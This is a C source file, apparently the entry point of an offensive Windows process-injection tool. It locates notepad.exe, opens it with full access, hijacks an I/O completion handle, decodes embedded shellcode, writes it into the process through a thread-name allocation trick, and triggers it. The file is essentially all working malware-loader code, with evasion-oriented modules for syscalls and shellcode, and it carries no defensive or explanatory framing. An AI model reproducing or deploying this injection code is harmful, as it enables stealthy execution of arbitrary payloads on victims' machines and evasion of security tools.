#include <processthreadsapi.h>
#include <windows.h>
#include <tlhelp32.h>
#include <unwin.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "debugging/debugging.h"
#include "injection/injection.h"
#include "memory/memory.h"
#include "shellcode/shellcode.h"
#include "syscalls/syscalls.h"

extern Ade GlobalAde;

#define TARGET_PROCNAME "notepad.exe"

int GetPidByName(char* processName) {
    int pid = 0;
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First( snapshot, &pe32 )) {
        do {
            if (strcmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe32));
    }

    return pid;
}

int main() {
    MEMORY_ALLOC memoryShellcodeAlloc;
    HANDLE       hProcess;

    GlobalAde = InitAde();
    int pid   = GetPidByName(TARGET_PROCNAME);

    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    if (!hProcess) {
        DEBUG_ERROR("OpenProcess: 0x%lx", GetLastError());
        DEBUG_GETCHAR();
        return -1;
    }

    HANDLE completionIoHandle = DuplicateHandleK(
        hProcess,
        pid,
        IO_COMPLETION_HANDLETYPE
    );

    size_t shellcodeSize = GetShellcodeSize();
    BYTE shellcode[ shellcodeSize ];
    ShellcodeDecode(shellcode);

    if (!ThreadNameAlloc(
        hProcess,
        shellcode,
        shellcodeSize,
        &memoryShellcodeAlloc
    )) {
        DEBUG_ERROR("FAILED ThreadNameAlloc");
        return -1;
    }

    DEBUG_INFO("Execution Addr @ 0x%p", memoryShellcodeAlloc.executionAddr);

    Inject(hProcess, completionIoHandle, memoryShellcodeAlloc.executionAddr);

    DEBUG_GETCHAR();

    return 0;
}
